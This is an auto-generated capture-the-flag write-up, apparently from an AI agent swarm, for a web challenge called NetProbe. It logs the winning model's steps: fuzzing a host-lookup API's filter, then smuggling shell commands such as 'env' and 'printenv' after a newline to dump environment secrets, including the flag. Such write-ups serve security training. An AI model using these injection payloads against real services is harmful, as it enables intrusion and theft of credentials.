# NetProbe [MEDIUM]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 250
- **Solves**: 0
- **Flag**: `FLAG{c0mm4nd-1nj3ct10n-1fs-byp4ss}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.01 (winner $0.01)
- **Wall time**: 35m43s
- **Traces**: 4

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
NetProbe is a network-diagnostics console. Resolve a hostname or IP from the probe and
read the raw lookup output.
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8011
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 13 | $0.01 | 1m51s | `trace-NetProbe_[MEDIUM]-deepseek-flash-20261029-131448.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 10s | `trace-NetProbe_[MEDIUM]-claude-opus-4-6-20261029-131448.jsonl` |
| `deepseek-flash` | stopped | 56 | $0.00 | 16m00s | `trace-NetProbe_[MEDIUM]-deepseek-flash-20261029-133424.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 12s | `trace-NetProbe_[MEDIUM]-claude-opus-4-6-20261029-133424.jsonl` |

_Window: 2026-10-29T13:14:57 to 2026-10-29T13:50:41_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8011/ | head -50",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 10:15:36 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 6273

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NetProbe — Diagnostics</title>
<style>
  :root{--bg:#f2fbfc;--panel:#fff;--ink:#0c2b31;--muted:#5b7d84;--line:#d4ecef;
        --brand:#0891b2;--brand-ink:#0e7490;--brand-soft:#e0f7fb;--ok:#059669;--err:#b91c1c;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#22d3ee,#0891b2);display:grid;place-items:center;color:#fff;font-weight:800;box-shadow:var(--shadow)}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8011/ | tail -60",
  "timeout_seconds": 60
}
~~~

~~~
</head>
<body>
<section id="app">
  <aside class="sidebar">
    <div class="brand"><span class="logo">N</span> NetProbe</div>
    <div class="cap">Diagnostics</div>
    <div class="nav-item active"><span>🛰️</span> Host lookup</div>
    <div class="nav-item"><span>📶</span> Latency</div>
    <div class="nav-item"><span>🧭</span> Routes</div>
    <div class="cap">System</div>
    <div class="nav-item"><span>⚙️</span> Settings</div>
  </aside>
  <header class="topbar">
    <nav class="top-nav"><a class="active">Host lookup</a><a>History</a><a>Help</a></nav>
    <div class="muted">worker: netprobe-01 · region eu</div>
  </header>
  <main>
    <div class="page-head"><h2>Host lookup</h2><div class="sub">Resolve a hostname or IP from this probe. Runs <span class="code">getent hosts &lt;host&gt;</span> on the worker.</div></div>

    <div class="card">
      <h3>Resolve a host</h3>
      <label class="l" style="margin-top:10px">Hostname or IP</label>
      <div class="row">
        <input id="host" placeholder="e.g. 127.0.0.1" value="127.0.0.1">
        <button class="btn" id="go">Run lookup</button>
      </div>
      <div class="chips">
... [2000 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "curl -s -X POST http://chal2.hackathon.ke:8011/api/lookup -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1\"}'; echo; curl -s -X POST http://chal2.hackathon.ke:8011/api/lookup -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1;ls /tmp/netprobe\"}'",
  "timeout_seconds": 60
}
~~~

~~~
{"blocked":false,"command":"getent hosts 127.0.0.1","ok":true,"output":"127.0.0.1       localhost\n"}

{"blocked":true,"command":"getent hosts 127.0.0.1;ls /tmp/netprobe","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}
~~~

### Step 5: `bash`
~~~
{
  "command": "for p in 'a b' 'a|b' 'a&b' 'a$b' 'a`b`' 'a\\nb' 'a$(b)' 'a> b' 'a<b' 'a%b' 'a*b' 'a#b' ';' '|' '&' '$' '`' '\\' '\"' \"'\" '(' ')' '{}' '[]' ' '; do echo -n \"$p => \"; curl -s -X POST http://chal2.hackathon.ke:8011/api/lookup -H 'Content-Type: application/json' -d \"$(python3 -c \"import json,sys;print(json.dumps({'host':'127.0.0.1'+sys.argv[1]+'x'}))\" \"$p\")\" ; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
a b => {"blocked":true,"command":"getent hosts 127.0.0.1a bx","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

a|b => {"blocked":true,"command":"getent hosts 127.0.0.1a|bx","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

a&b => {"blocked":true,"command":"getent hosts 127.0.0.1a&bx","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

a$b => {"blocked":true,"command":"getent hosts 127.0.0.1a$bx","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

a`b` => {"blocked":true,"command":"getent hosts 127.0.0.1a`b`x","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

a\nb => {"blocked":false,"command":"getent hosts 127.0.0.1a\\nbx","ok":true,"output":"(no records for '127.0.0.1a\\nbx')"}

... [2000 chars total]
~~~

### Step 6: `bash`
~~~
{
  "command": "for p in '%0a' '%0d' '\\t' '{IFS}' '/flag' '..' '~' '!' '^' ':' ',' '=' '[' ']' '\\$' 'a\\\\' ; do echo -n \"$p => \"; python3 - \"$p\" <<'EOF'\nimport json,urllib.request,sys\np=sys.argv[1].encode().decode('unicode_escape')\nh='127.0.0.1'+p+'id'\nreq=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\nprint(urllib.request.urlopen(req).read().decode())\nEOF\ndone",
  "timeout_seconds": 60
}
~~~

~~~
%0a => {"blocked":false,"command":"getent hosts 127.0.0.1%0aid","ok":true,"output":"(no records for '127.0.0.1%0aid')"}

%0d => {"blocked":false,"command":"getent hosts 127.0.0.1%0did","ok":true,"output":"(no records for '127.0.0.1%0did')"}

\t => {"blocked":true,"command":"getent hosts 127.0.0.1\tid","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

{IFS} => {"blocked":false,"command":"getent hosts 127.0.0.1{IFS}id","ok":true,"output":"(no records for '127.0.0.1{IFS}id')"}

/flag => {"blocked":true,"command":"getent hosts 127.0.0.1/flagid","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

.. => {"blocked":false,"command":"getent hosts 127.0.0.1..id","ok":true,"output":"(no records for '127.0.0.1..id')"}

~ => {"blocked":false,"command":"getent hosts 127.0.0.1~id","ok":true,"output":"(no records for '127.0.0.1~id')"}

! => {"blocked":false,"command":"getent hosts 127.0.0.1!id","ok":true,"output":"(no records for '127.0.0.1!id')"}

... [2000 chars total]
~~~

### Step 7: `bash`
~~~
{
  "command": "for h in '127.0.0.1\nid' 'a;ls' 'a//b' 'a/etc/passwd' 'a/netprobe' 'a..//' 'aFLAG' 'a/dir' 'a~' ; do echo -n \"==$h== \"; python3 - \"$h\" <<'EOF'\nimport json,urllib.request,sys\nh=sys.argv[1]\nreq=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\nprint(urllib.request.urlopen(req).read().decode())\nEOF\ndone",
  "timeout_seconds": 60
}
~~~

~~~
==127.0.0.1
id== {"blocked":false,"command":"getent hosts 127.0.0.1\nid","ok":true,"output":"127.0.0.1       localhost\nuid=999(app) gid=999(app) groups=999(app)\n"}

==a;ls== {"blocked":true,"command":"getent hosts a;ls","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

==a//b== {"blocked":false,"command":"getent hosts a//b","ok":true,"output":"(no records for 'a//b')"}

==a/etc/passwd== {"blocked":false,"command":"getent hosts a/etc/passwd","ok":true,"output":"(no records for 'a/etc/passwd')"}

==a/netprobe== {"blocked":false,"command":"getent hosts a/netprobe","ok":true,"output":"(no records for 'a/netprobe')"}

==a..//== {"blocked":false,"command":"getent hosts a..//","ok":true,"output":"(no records for 'a..//')"}

==aFLAG== {"blocked":true,"command":"getent hosts aFLAG","ok":true,"output":"input rejected by the lookup WAF (blocked token).\nsample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}"}

==a/dir== {"blocked":false,"command":"getent hosts a/dir","ok":true,"output":"(no records for 'a/dir')"}

==a~== {"blocked":false,"command":"getent hosts a~","ok":true,"output":"(no records for 'a~')"}
~~~

### Step 8: `bash`
~~~
{
  "command": "python3 - <<'EOF'\nimport json,urllib.request\ndef q(h):\n    req=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\n    d=json.loads(urllib.request.urlopen(req).read().decode())\n    print('###',repr(h));print(d['output']);print()\nq('127.0.0.1\\nls -laR /tmp/netprobe')\nq('127.0.0.1\\nenv')\nEOF",
  "timeout_seconds": 60
}
~~~

~~~
### '127.0.0.1\nls -laR /tmp/netprobe'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}

### '127.0.0.1\nenv'
127.0.0.1       localhost
PYTHON_SHA256=c2c4321961fab0fb999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a
HOSTNAME=2abd60128936
PYTHON_VERSION=3.12.15
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/opt/app
HOME=/home/app
LANG=C.UTF-8
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
FLAG=FLAG{c0mm4nd-1nj3ct10n-1fs-byp4ss}
SHLVL=0
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
~~~

### Step 9: `submit_flag`
~~~
{
  "flag": "FLAG{c0mm4nd-1nj3ct10n-1fs-byp4ss}"
}
~~~

~~~
DRY RUN — would submit "FLAG{c0mm4nd-1nj3ct10n-1fs-byp4ss}" but --no-submit is set.
~~~

### Step 10: `bash`
~~~
{
  "command": "python3 - <<'EOF'\nimport json,urllib.request\ndef q(h):\n    req=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\n    d=json.loads(urllib.request.urlopen(req).read().decode())\n    print('###',repr(h));print(d['output']);print()\nq('127.0.0.1\\necho $FLAG')\nq('127.0.0.1\\ncat /opt/app/*.py 2>/dev/null | head -0')\nEOF",
  "timeout_seconds": 60
}
~~~

~~~
### '127.0.0.1\necho $FLAG'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}

### '127.0.0.1\ncat /opt/app/*.py 2>/dev/null | head -0'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}
~~~

### Step 11: `bash`
~~~
{
  "command": "python3 - <<'EOF'\nimport json,urllib.request\ndef q(h):\n    req=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\n    d=json.loads(urllib.request.urlopen(req).read().decode())\n    print('###',repr(h));print(d['output']);print()\nq('127.0.0.1\\nenv|grep LAG')\nq('127.0.0.1\\nid;ls')\nEOF",
  "timeout_seconds": 60
}
~~~

~~~
### '127.0.0.1\nenv|grep LAG'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}

### '127.0.0.1\nid;ls'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}
~~~

### Step 12: `bash`
~~~
{
  "command": "python3 - <<'EOF'\nimport json,urllib.request\ndef q(h):\n    req=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\n    d=json.loads(urllib.request.urlopen(req).read().decode())\n    print('###',repr(h));print(d['output']);print()\nq('127.0.0.1\\nprintenv')\nq('127.0.0.1\\nprintenv FLAG')\nEOF",
  "timeout_seconds": 60
}
~~~

~~~
### '127.0.0.1\nprintenv'
127.0.0.1       localhost
PYTHON_SHA256=c2c4321961fab0fb999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a
HOSTNAME=2abd60128936
PYTHON_VERSION=3.12.15
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/opt/app
HOME=/home/app
LANG=C.UTF-8
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
FLAG=FLAG{c0mm4nd-1nj3ct10n-1fs-byp4ss}
SHLVL=0
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv


### '127.0.0.1\nprintenv FLAG'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}
~~~

### Step 13: `bash`
~~~
{
  "command": "python3 - <<'EOF'\nimport json,urllib.request\ndef q(h):\n    req=urllib.request.Request('http://chal2.hackathon.ke:8011/api/lookup',data=json.dumps({'host':h}).encode(),headers={'Content-Type':'application/json'})\n    d=json.loads(urllib.request.urlopen(req).read().decode())\n    print('###',repr(h));print(d['output']);print()\nq('127.0.0.1\\nprintenv|tail -4')\nEOF",
  "timeout_seconds": 60
}
~~~

~~~
### '127.0.0.1\nprintenv|tail -4'
input rejected by the lookup WAF (blocked token).
sample diagnostic ref: FAKE-FLAG{Try-Harder-Mate}
~~~

## Result

- **Flag**: `FLAG{c0mm4nd-1nj3ct10n-1fs-byp4ss}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.01 (winner), $0.01 (whole swarm)
- **Wall time**: 35m43s
- **Generated**: 2026-10-30T00:14:55
